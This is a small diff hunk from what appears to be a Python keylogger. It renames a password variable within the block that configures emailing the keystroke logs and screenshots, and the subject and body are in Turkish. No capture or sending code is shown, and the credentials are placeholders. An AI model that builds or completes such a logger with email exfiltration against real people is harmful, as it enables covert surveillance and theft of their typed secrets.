@@ -17,7 +17,7 @@ time_ss = 10
 
 sender_email = '..'
 receiver_email = '..'
-app_password = '..'
+email_password = '..'
 subject = 'Keylogger Rapor'
 body = 'Keylogger kayıtları ve ekran görüntüleri ektedir.'
 attachments = []
